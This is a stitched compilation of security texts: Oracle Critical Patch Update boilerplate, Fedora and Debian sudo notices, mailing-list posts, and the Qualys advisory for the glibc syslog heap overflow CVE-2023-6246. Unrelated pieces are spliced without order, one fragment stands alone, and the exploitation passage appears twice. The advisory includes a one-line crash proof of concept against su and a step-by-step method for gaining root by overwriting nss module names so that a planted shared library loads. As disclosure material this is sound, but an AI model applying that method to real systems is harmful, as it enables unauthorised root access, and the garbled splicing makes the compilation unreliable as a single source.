This Critical Patch Update contains 520 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [April 2022 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2857016.1).

#### Note:

* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security patches detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpuapr2022verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).

Subject: Re: CVE-2023-6246: Heap-based buffer overflow in the
 glibc's syslog()

FYI, the glibc advisory announcement is here:

<https://sourceware.org/pipermail/libc-announce/2024/000037.html>

and here are the individual advisories:

<https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2024-0001;hb=HEAD>
<https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2024-0002;hb=HEAD>
<https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2024-0003;hb=HEAD>

Thanks,

> Unsurprisingly, our fuzzer also overwrote various pieces of heap
> metadata (chunk headers managed internally by the glibc's malloc), and
> therefore triggered all kinds of assertion failures and security checks:
>
> ------------------------------------------------------------------------
> $ grep -A1 __libc_message fuzzer.out | cut -d'"' -f2 | sort -u
> ...
> chunk_main_arena (bck->bk)
> chunk_main_arena (fwd)
> corrupted double-linked list
> corrupted double-linked list (not small)
> corrupted size vs. prev_size
> corrupted size vs. prev_size in fastbins
> double free or corruption (out)
> free(): corrupted unsorted chunks
> free(): invalid next size (fast)
> free(): invalid pointer
> free(): invalid size
> malloc_consolidate(): invalid chunk size
> malloc(): corrupted top size
> malloc(): invalid size (unsorted)
> malloc(): smallbin double linked list corrupted
> malloc(): unaligned tcache chunk detected
> malloc(): unsorted double linked list corrupted
> munmap_chunk(): invalid pointer
> ------------------------------------------------------------------------
>
> Although some of these corruptions might be exploitable, we decided to
> not pursue this avenue of exploitation either:
>
> - we cannot overwrite a chunk header with a size field and an fd or bk
>   pointer that are both valid (they must both contain null bytes to be
>   valid), which severely limits our exploitation options;
>
> - in any case, we would probably need a specific heap, mmap, or stack
>   address to exploit such a corruption, but we do not have the luxury of
>   an information leak, and all these addresses are too heavily
>   randomized by ASLR to be brute forced.

> As discussed in the "2/ struct service_user overwrite" subsection of our
> Baron Samedit advisory, if we overwrite the name[] field of a heap-based
> struct nss_module with a string of characters that contains a slash (for
> example "A/B/C"), then at lines 180-181 the name of a shared library is
> constructed ("libnss_A/B/C.so.2"), and at line 187 this shared library
> is loaded from our current working directory (because its name contains
> a slash, but does not start with a slash) and executed as root (because
> su is a SUID-root program):

>
> Unfortunately, the __progname part (which we control) of the string that
> overflows __vsyslog_internal()'s buffer cannot contain a slash (because
> __progname is the basename() of argv[0]). Luckily, however, the part of
> the overflowing string that we do not control (the pam_syslog() format
> string) includes the absolute path of our tty, which contains a slash.
> For example, if:
>
> - our tty is /dev/pts/23 (we use forkpty() in our exploit);
>
> - our unprivileged local user is nobody (uid 65534);
>
> - the argv[0] (and hence __progname) that we use to execute su is a long
>   string of 'A' characters (longer than 1024);
>
> then we can overwrite the name[] field of a heap-based struct nss_module
> with a string of the form:
>
>   "AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost=  user=root"
>
> Consequently, if we first create the following three directories (in our
> current working directory):
>
>   "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty="
>   "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev"
>   "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts"
>
> and also create the following shared library (in our current working
> directory):
>
>   "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost=  user=root.so.2"
>
> then this shared library will eventually be loaded and executed with
> full root privileges. In our tests, it takes a few 10,000s of tries to
> successfully brute force the exploit parameters (the length of argv[0],
> and the whitelist option and its associated environment variables).
>
> Note: this exploit could certainly be made much more efficient; in
> theory, it could even be a one-shot exploit, because we do not need to
> brute force the ASLR, only the heap layout.

## Oracle Critical Patch Update Advisory - July 2021

### Description

A Critical Patch Update is a collection of patches for multiple security vulnerabilities.  These patches address vulnerabilities in Oracle code and in third-party components included in Oracle products.  These patches are usually cumulative, but each advisory describes only the security patches added since the previous Critical Patch Update Advisory. Thus, prior Critical Patch Update advisories should be reviewed for information regarding earlier published security patches.  Refer to [“Critical Patch Updates, Security Alerts and Bulletins”](https://www.oracle.com/security-alerts/) for information about Oracle Security advisories.

**Oracle continues to periodically receive reports of attempts to maliciously exploit vulnerabilities for which Oracle has already released security patches. In some instances, it has been reported that attackers have been successful because targeted customers had failed to apply available Oracle patches. Oracle therefore strongly recommends that customers remain on actively-supported versions and apply Critical Patch Update security patches without delay.**

This Critical Patch Update contains 342 new security patches across the product families listed below. Please note that an MOS note summarizing the content of this Critical Patch Update and other Oracle Software Security Assurance activities is located at  [July 2021 Critical Patch Update: Executive Summary and Analysis](https://support.oracle.com/rs?type=doc&id=2788740.1).

#### Note:

* Vulnerabilities affecting either Oracle Database or Oracle Fusion Middleware may affect Oracle Fusion Applications, so Oracle customers should refer to Oracle Fusion Applications Critical Patch Update Knowledge Document, [My Oracle Support Note 1967316.1](https://support.oracle.com/rs?type=doc&id=1967316.1) for information on patches to be applied to Fusion Application environments.
* Vulnerabilities affecting Oracle Solaris may affect Oracle ZFSSA so Oracle customers should refer to the Oracle and Sun Systems Product Suite Critical Patch Update Knowledge Document, [My Oracle Support Note 2160904.1](https://support.oracle.com/rs?type=doc&id=2160904.1) for information on minimum revisions of security patches required to resolve ZFSSA issues published in Critical Patch Updates and Solaris Third Party bulletins.
* Solaris Third Party Bulletins are used to announce security patches for third party software distributed with Oracle Solaris. Solaris 10 customers should refer to the latest patch-sets which contain critical security fixes and detailed in Systems Patch Availability Document. Please see Reference Index of CVE IDs and Solaris Patches ([My Oracle Support Note 1448883.1](https://support.oracle.com/rs?type=doc&id=1448883.1)) for more information.
* Users running Java SE with a browser can download the latest release from <https://java.com>. Users on the Windows and Mac OS X platforms can also use [automatic updates](https://www.java.com/en/download/help/java_update.xml) to get the latest release.

### Risk Matrix Content

Risk matrices list only security vulnerabilities that are newly addressed by the patches associated with this advisory. Risk matrices for previous security patches can be found in [previous Critical Patch Update advisories and Alerts](https://www.oracle.com/security-alerts). An English text version of the risk matrices provided in this document is  [here](/security-alerts/cpujul2021verbose.html).

Several vulnerabilities addressed in this Critical Patch Update affect multiple products. Each vulnerability is identified by a [CVE#](https://cve.mitre.org/) which is its unique identifier. A vulnerability that affects multiple products will appear with the same CVE# in all risk matrices. A CVE# shown in *italics* indicates that this vulnerability impacts a different product, but also has impact on the product where the italicized CVE# is listed.

Security vulnerabilities are scored using CVSS version 3.1 (see [Oracle CVSS Scoring](/security-alerts/cvssscoringsystem.html) for an explanation of how Oracle applies CVSS version 3.1).

Oracle conducts an analysis of each security vulnerability addressed by a Critical Patch Update. Oracle does not disclose detailed information about this security analysis to customers, but the resulting Risk Matrix and associated documentation provide information about the type of vulnerability, the conditions required to exploit it, and the potential impact of a successful exploit. Oracle provides this information, in part, so that customers may conduct their own risk analysis based on the particulars of their product usage. For more information, see [Oracle vulnerability disclosure policies](https://www.oracle.com/us/support/assurance/disclosure-policies/index.html).

Oracle lists updates that address vulnerabilities in third-party components that are not exploitable in the context of their inclusion in their respective Oracle product beneath the product's risk matrix.

The protocol in the risk matrix implies that all of its secure variants (if applicable) are affected as well. For example, if HTTP is listed as an affected protocol, it implies that HTTPS (if applicable) is also affected. The secure variant of a protocol is listed in the risk matrix only if it is the *only* variant affected, e.g. HTTPS will typically be listed for vulnerabilities in SSL and TLS.

### Workarounds

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Critical Patch Update security patches as soon as possible**. Until you apply the Critical Patch Update patches, it may be possible to reduce the risk of successful attack by blocking network protocols required by an attack. For attacks that require certain privileges or access to certain packages, removing the privileges or the ability to access the packages from users that do not need the privileges may help reduce the risk of successful attack. Both approaches may break application functionality, so Oracle strongly recommends that customers test changes on non-production systems. Neither approach should be considered a long-term solution as neither corrects the underlying problem.

### Skipped Critical Patch Updates

Oracle strongly recommends that customers apply security patches as soon as possible. For customers that have skipped one or more Critical Patch Updates and are concerned about products that do not have security patches announced in this Critical Patch Update, please review [previous Critical Patch Update advisories](https://www.oracle.com/security-alerts) to determine appropriate actions.

### Critical Patch Update Supported Products and Versions

Patches released through the Critical Patch Update program are provided only for product versions that are covered under the Premier Support or Extended Support phases of the  [Lifetime Support Policy](https://www.oracle.com/us/support/lifetime-support/index.html?ssSourceSiteId=otnen). Oracle recommends that customers plan product upgrades to ensure that patches released through the Critical Patch Update program are available for the versions they are currently running.

Product releases that are not under Premier Support or Extended Support are not tested for the presence of vulnerabilities addressed by this Critical Patch Update. However, it is likely that earlier versions of affected releases are also affected by these vulnerabilities. As a result, Oracle recommends that customers upgrade to supported versions.

Database, Fusion Middleware, and Oracle Enterprise Manager products are patched in accordance with the Software Error Correction Support Policy explained in [My Oracle Support Note 209768.1](https://support.oracle.com/rs?type=doc&id=209768.1). Please review the [Technical Support Policies](https://www.oracle.com/us/support/policies/index.html?ssSourceSiteId=otnen) for further guidelines regarding support policies and phases of support.

Fedora Update Notification
FEDORA-2021-2cb63d912a
2021-01-27 01:17:26.446133
--------------------------------------------------------------------------------

Name : sudo
Product : Fedora 33
Version : 1.9.5p2
Release : 1.fc33
URL : <https://www.sudo.ws>
Summary : Allows restricted root access for specified users
Description :
Sudo (superuser do) allows a system administrator to give certain
users (or groups of users) the ability to run some (or all) commands
as root while logging all commands and arguments. Sudo operates on a
per-command basis. It is not a replacement for the shell. Features
include: the ability to restrict what commands a user may run on a
per-host basis, copious logging of each command (providing a clear
audit trail of who did what), a configurable timeout of the sudo
command, and the ability to use the same configuration file (sudoers)
on many different machines.

Summary
========================================================================

We discovered a heap-based buffer overflow in the GNU C Library's
__vsyslog_internal() function, which is called by both syslog() and
vsyslog(). This vulnerability was introduced in glibc 2.37 (in August
2022) by the following commit:

  <https://sourceware.org/git?p=glibc.git;a=commit;h=52a5be0df411ef3ff45c10c7c308cb92993d15b1>

and was also backported to glibc 2.36 because this commit was a fix for
another, minor vulnerability in __vsyslog_internal() (CVE-2022-39046, an
"uninitialized memory [read] from the heap"):

  <https://sourceware.org/bugzilla/show_bug.cgi?id=29536>

For example, we confirmed that Debian 12 and 13, Ubuntu 23.04 and 23.10,
and Fedora 37 to 39 are vulnerable to this buffer overflow. Furthermore,
we successfully exploited an up-to-date, default installation of Fedora
38 (on amd64): a Local Privilege Escalation, from any unprivileged user
to full root. Other distributions are probably also exploitable.

To the best of our knowledge, this vulnerability cannot be triggered
remotely in any likely scenario (because it requires an argv[0], or an
openlog() ident argument, longer than 1024 bytes to be triggered).

Last-minute note: in December 1997 Solar Designer published information
about a very similar vulnerability in the vsyslog() of the old Linux
libc (<https://insecure.org/sploits/linux.libc.5.4.38.vsyslog.html>).

========================================================================
Analysis
========================================================================

In the glibc, both syslog() and vsyslog() call the vulnerable function
__vsyslog_internal():

------------------------------------------------------------------------
122 __vsyslog_internal (int pri, const char *fmt, va_list ap,
123                     unsigned int mode_flags)
124 {
125   /* Try to use a static buffer as an optimization.  */
126   char bufs[1024];
127   char *buf = NULL;
128   size_t bufsize = 0;
...
171 #define SYSLOG_HEADER(__pri, __timestamp, __msgoff, pid) \
172   "<%d>%s%n%s%s%.0d%s: ",                                \
173   __pri, __timestamp, __msgoff,                          \
174   LogTag == NULL ? __progname : LogTag,                  \
175   "[" + (pid == 0), pid, "]" + (pid == 0)
...
182     l = __snprintf (bufs, sizeof bufs,
183                     SYSLOG_HEADER (pri, timestamp, &msgoff, pid));
...
187   if (0 <= l && l < sizeof bufs)
188     {
...
202     }
203
204   if (buf == NULL)
205     {
206       buf = malloc ((bufsize + 1) * sizeof (char));
...
213             __snprintf (buf, l + 1,
214                         SYSLOG_HEADER (pri, timestamp, &msgoff, pid));
...
221           __vsnprintf_internal (buf + l, bufsize - l + 1, fmt, apc,
222                                 mode_flags);
------------------------------------------------------------------------

- at lines 182-183, SYSLOG_HEADER() includes __progname (the basename()
  of argv[0]) if LogTag is NULL (e.g., if openlog() was not called, or
  called with a NULL ident argument);

- because a local attacker fully controls argv[0] and hence __progname
  (even when executing a SUID-root program such as su), at line 187 l
  (the return value of __snprintf()) can be larger than sizeof bufs
  (1024), in which case the code block at lines 188-202 is skipped;

- consequently, at line 203 buf is still NULL and bufsize is still 0,
  and at line 206 a very small 1-byte buf is malloc()ated (because
  bufsize is 0);

- at lines 213-214 this small buf is overflowed with the attacker-
  controlled __progname (because l is larger than 1024), and at lines
  221-222 this small buf is further overflowed (because bufsize - l + 1
  is 0 - l + 1, a very large size_t).

========================================================================
Proof of concept
========================================================================

$ (exec -a "`printf '%0128000x' 1`" /usr/bin/su < /dev/null)
Password: Segmentation fault (core dumped)

========================================================================
Exploitation
========================================================================

We decided to exploit this vulnerability through su (the most common
SUID-root program) on Fedora 38. To authenticate a user, su calls the
PAM library, and if the password provided by the user is incorrect, then
PAM calls the glibc's syslog() function without calling openlog() first,
thus allowing us to trigger the buffer overflow in __vsyslog_internal():

------------------------------------------------------------------------
782                         pam_syslog(pamh, LOG_NOTICE,
783                                  "authentication failure; "
784                                  "logname=%s uid=%d euid=%d "
785                                  "tty=%s ruser=%s rhost=%s "
786                                  "%s%s",
787                                  new->name, new->uid, new->euid,
788                                  tty ? (const char *)tty : "",
789                                  ruser ? (const char *)ruser : "",
790                                  rhost ? (const char *)rhost : "",
791                                  (new->user && new->user[0] != '\0')
792                                   ? " user=" : "",
793                                  new->user
794                         );
------------------------------------------------------------------------
107 pam_syslog (const pam_handle_t *pamh, int priority,
108             const char *fmt, ...)
109 {
...
113   pam_vsyslog (pamh, priority, fmt, args);
------------------------------------------------------------------------
 73 pam_vsyslog (const pam_handle_t *pamh, int priority,
 74              const char *fmt, va_list args)
 75 {
 ..
 81       if (asprintf (&msgbuf1, "%s(%s:%s):", pamh->mod_name,
 82                     pamh->service_name?pamh->service_name:"<unknown>",
 83                     _pam_choice2str (pamh->choice)) < 0)
 ..
 91   if (vasprintf (&msgbuf2, fmt, args) < 0)
 ..
 99   syslog (LOG_AUTHPRIV|priority, "%s %s",
100           (msgbuf1 ? msgbuf1 : _PAM_SYSTEM_LOG_PREFIX), msgbuf2);
------------------------------------------------------------------------

But what should we overwrite in the heap to successfully exploit this
buffer overflow? Initially, because su calls setlocale(LC_ALL, ""); at
the very beginning of its su_main() function, we tried to reuse the key
idea from our Baron Samedit exploits (CVE-2021-3156 in Sudo): we wrote a
rudimentary fuzzer to execute su with a random argv[0] and random locale
environment variables and automatically inspect the resulting crashes in
gdb. Unfortunately this fuzzer failed to produce interesting results: we
only obtained a handful of unique crashes, and they did not look very
promising.

However, we did not investigate the reasons for this failure, because
while browsing through su's source code we noticed that su_main() calls
env_whitelist_from_string() to parse the argument of the -w command-line
option:

------------------------------------------------------------------------
1118                 case 'w':
1119                         env_whitelist_from_string(su, optarg);
1120                         break;
------------------------------------------------------------------------
 692 static int env_whitelist_from_string(struct su_context *su, const char *str)
 693 {
 694         char **all = strv_split(str, ",");
 ...
 703         STRV_FOREACH(one, all)
 704                 env_whitelist_add(su, *one);
 705         strv_free(all);
 706         return 0;
 707 }
------------------------------------------------------------------------
 662 static int env_whitelist_add(struct su_context *su, const char *name)
 663 {
 664         const char *env = getenv(name);
 665
 666         if (!env)
 667                 return 1;
 668         if (strv_extend(&su->env_whitelist_names, name))
 669                 err_oom();
 670         if (strv_extend(&su->env_whitelist_vals, env))
 671                 err_oom();
 672         return 0;
 673 }
------------------------------------------------------------------------

Conveniently, env_whitelist_from_string() allows us (attackers) to
malloc()ate and free() an arbitrary number of arbitrary strings at the
very beginning of su's execution: an almost perfect heap feng shui. We
therefore rewrote our fuzzer to execute su with a random argv[0] and a
random whitelist option (instead of random locale environment variables)
and immediately observed numerous unique crashes; among these, three in
particular caught our attention.

========================================================================
1/ Corruption of PAM structures
========================================================================

Surprisingly, our fuzzer directly overwrote two PAM function pointers
(in struct pam_data and struct handler):

------------------------------------------------------------------------
Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.
0x00007fa7d3b0e3ac in _pam_free_data (status=7, pamh=0x56211242ec10) at /usr/src/debug/pam-1.5.2-16.fc38.x86_64/libpam/pam_data.c:161

Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.

rax            0x4545454545454545  4991471925827290437
------------------------------------------------------------------------

Although this sounds exciting at first (a call to 0x4141414141414141!)
we decided to not pursue this avenue of exploitation:

- we cannot overwrite such a function pointer with null bytes (because
  we overflow __vsyslog_internal()'s buffer with a null-terminated
  string), but userland addresses contain at least two null bytes;

- we could try to partially overwrite such a function pointer, but we do
  not control the end of the string that overflows __vsyslog_internal()'s
  buffer (the end of the aforementioned pam_syslog() format string), and
  such an uncontrolled, partially overwritten function pointer is very
  unlikely to miraculously point to a useful ROP gadget.

========================================================================
2/ Corruption of heap metadata
========================================================================

Unsurprisingly, our fuzzer also overwrote various pieces of heap
metadata (chunk headers managed internally by the glibc's malloc), and
therefore triggered all kinds of assertion failures and security checks:

------------------------------------------------------------------------
$ grep -A1 __libc_message fuzzer.out | cut -d'"' -f2 | sort -u
...
chunk_main_arena (bck->bk)
chunk_main_arena (fwd)
corrupted double-linked list
corrupted double-linked list (not small)
corrupted size vs. prev_size
corrupted size vs. prev_size in fastbins
double free or corruption (out)
free(): corrupted unsorted chunks
free(): invalid next size (fast)
free(): invalid pointer
free(): invalid size
malloc_consolidate(): invalid chunk size
malloc(): corrupted top size
malloc(): invalid size (unsorted)
malloc(): smallbin double linked list corrupted
malloc(): unaligned tcache chunk detected
malloc(): unsorted double linked list corrupted
munmap_chunk(): invalid pointer
------------------------------------------------------------------------

Although some of these corruptions might be exploitable, we decided to
not pursue this avenue of exploitation either:

- we cannot overwrite a chunk header with a size field and an fd or bk
  pointer that are both valid (they must both contain null bytes to be
  valid), which severely limits our exploitation options;

- in any case, we would probably need a specific heap, mmap, or stack
  address to exploit such a corruption, but we do not have the luxury of
  an information leak, and all these addresses are too heavily
  randomized by ASLR to be brute forced.

========================================================================
3/ Corruption of nss structures
========================================================================

Our fuzzer also produced two crashes that immediately caught our
attention because they are directly related to one of the techniques
that we used to exploit Baron Samedit:

------------------------------------------------------------------------
Thread 2.1 "su" received signal SIGSEGV, Segmentation fault.

------------------------------------------------------------------------

As discussed in the "2/ struct service_user overwrite" subsection of our
Baron Samedit advisory, if we overwrite the name[] field of a heap-based
struct nss_module with a string of characters that contains a slash (for
example "A/B/C"), then at lines 180-181 the name of a shared library is
constructed ("libnss_A/B/C.so.2"), and at line 187 this shared library
is loaded from our current working directory (because its name contains
a slash, but does not start with a slash) and executed as root (because
su is a SUID-root program):

------------------------------------------------------------------------
170 module_load (struct nss_module *module)
171 {
...
180     if (__asprintf (&shlib_name, "libnss_%s.so%s",
181                     module->name, __nss_shlib_revision) < 0)
...
187     handle = __libc_dlopen (shlib_name);
------------------------------------------------------------------------

Unfortunately, the __progname part (which we control) of the string that
overflows __vsyslog_internal()'s buffer cannot contain a slash (because
__progname is the basename() of argv[0]). Luckily, however, the part of
the overflowing string that we do not control (the pam_syslog() format
string) includes the absolute path of our tty, which contains a slash.
For example, if:

- our tty is /dev/pts/23 (we use forkpty() in our exploit);

- our unprivileged local user is nobody (uid 65534);

- the argv[0] (and hence __progname) that we use to execute su is a long
  string of 'A' characters (longer than 1024);

then we can overwrite the name[] field of a heap-based struct nss_module
with a string of the form:

  "AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost=  user=root"

Consequently, if we first create the following three directories (in our
current working directory):

  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty="
  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev"
  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts"

and also create the following shared library (in our current working
directory):

  "libnss_AAAAAAAAAA: pam_unix(su:auth): authentication failure; logname= uid=65534 euid=0 tty=/dev/pts/23 ruser=nobody rhost=  user=root.so.2"

then this shared library will eventually be loaded and executed with
full root privileges. In our tests, it takes a few 10,000s of tries to
successfully brute force the exploit parameters (the length of argv[0],
and the whitelist option and its associated environment variables).

Note: this exploit could certainly be made much more efficient; in
theory, it could even be a one-shot exploit, because we do not need to
brute force the ASLR, only the heap layout.

members of linux-distros@...nwall (Salvatore Bonaccorso in particular).

========================================================================
Timeline
========================================================================

2023-11-07: We sent a preliminary draft of our advisory to Red Hat
Product Security.

2023-11-15: Red Hat Product Security acknowledged receipt of our email.

2023-11-16: Red Hat Product Security asked us if we could share our
exploit with them.

2023-11-17: We sent our exploit to Red Hat Product Security.

2023-11-21: Red Hat Product Security confirmed that our exploit worked,
and assigned CVE-2023-6246 to this heap-based buffer overflow in
__vsyslog_internal().

2023-12-05: Red Hat Product Security sent us a patch for CVE-2023-6246
(written by the glibc developers), and asked us for our feedback.

2023-12-07: While reviewing this patch, we discovered two more minor
vulnerabilities in the same function (an off-by-one buffer overflow and
an integer overflow). We immediately sent an analysis, proof of concept,
and patch proposal to Red Hat Product Security, and suggested that we
directly involve the glibc security team.

2023-12-08: Red Hat Product Security acknowledged receipt of our email,
and agreed that we should directly involve the glibc security team. We
contacted them on the same day, and they immediately replied with very
constructive comments.

2023-12-11: The glibc security team suggested that we postpone the
coordinated disclosure of all three vulnerabilities until January 2024
(because of the upcoming holiday season). We agreed.

2023-12-13: Red Hat Product Security assigned CVE-2023-6779 to the
off-by-one buffer overflow and CVE-2023-6780 to the integer overflow in
__vsyslog_internal().

2024-01-04: We suggested either January 23 or January 30 for the
Coordinated Release Date of these vulnerabilities. The glibc developers
agreed on January 30.

2024-01-12: The glibc developers sent us an updated version of the
patches for these vulnerabilities.

2024-01-13: We reviewed these patches, and sent our feedback to the
glibc developers.

2024-01-15: The glibc developers sent us the final version of the
patches for these vulnerabilities.

2024-01-16: We sent these patches and a draft of our advisory to the
linux-distros@...nwall. They immediately acknowledged receipt of our
email.

2024-01-30: Coordinated Release Date (18:00 UTC).

Package        : sudo
CVE ID         : CVE-2021-3156

The Qualys Research Labs discovered a heap-based buffer overflow
vulnerability in sudo, a program designed to provide limited super user
privileges to specific users. Any local user (sudoers and non-sudoers)
can exploit this flaw for root privilege escalation.

For the stable distribution (buster), this problem has been fixed in
version 1.8.27-1+deb10u3.

We recommend that you upgrade your sudo packages.

For the detailed security status of sudo please refer to its security
tracker page at:
<https://security-tracker.debian.org/tracker/sudo>

Subject: Re: Baron Samedit: Heap-based buffer overflow in
 Sudo (CVE-2021-3156)

Hi,

Just sharing a few thoughts and things I read elsewhere:

complexity
==========

The top comment on lobste.rs points out that a problem of sudo is
complexity:
<https://lobste.rs/s/efsvqu/heap_based_buffer_overflow_sudo_cve_2021#c_c6fcfa>

I think that's a very fair point. Also it seems the development trend
in sudo is to actually increase complexity even more and adding all
kinds of features that really should not be part of a suid tool, see
e.g.
<https://computingforgeeks.com/better-secure-new-sudo-release/>

The lobste.rs poster points to doas, which seems to be a much simpler
alternative coming from OpenBSD, a portable version exists:
<https://github.com/Duncaen/OpenDoas>

testing
=======

Top commenter at HN points out that there's a lack of testing in sudo:
<https://news.ycombinator.com/item?id=25921811>

Neither the commit that introduced this bug nor the commit that fixed
it contained a test.

Fair point again.
Here doas does not compare well: It does not seem to come with a test
suite at all.
